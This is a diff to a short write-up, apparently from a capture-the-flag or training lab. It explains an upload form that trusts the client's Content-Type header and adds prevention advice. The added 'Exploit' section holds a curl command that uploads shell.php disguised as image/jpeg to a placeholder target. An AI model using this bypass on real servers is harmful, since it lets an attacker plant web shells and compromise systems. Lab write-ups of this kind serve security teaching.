@@ -1,9 +1,19 @@
-# Upload content-type enforcement
+# Upload Content-Type Bypass
 
-There is a file upload form on the website, which allows the user to upload an image file.
+The file upload form validates only the `Content-Type` header, not the actual file content.
+By uploading a non-image file (e.g. a PHP script) with `Content-Type: image/jpeg`, the server
+accepts it and renders the flag.
 
-By uploading a file that is not an image (e.g. .php file) but with a valid content-type of an image, the website will show the flag.
+## Exploit
 
-## Hot to prevent this
+```bash
+curl -F "uploaded=@shell.php;type=image/jpeg" \
+     -F "Upload=Upload" \
+     "http://<IP>/index.php?page=upload"
+```
 
-Make a server-side validation of the content-type by checking the mime type (binary) of the file.
+## How to prevent
+
+- Validate the file's actual MIME type server-side using magic bytes (e.g. `finfo_file()` in PHP)
+- Never trust the `Content-Type` header supplied by the client
+- Restrict allowed extensions and store uploads outside the webroot
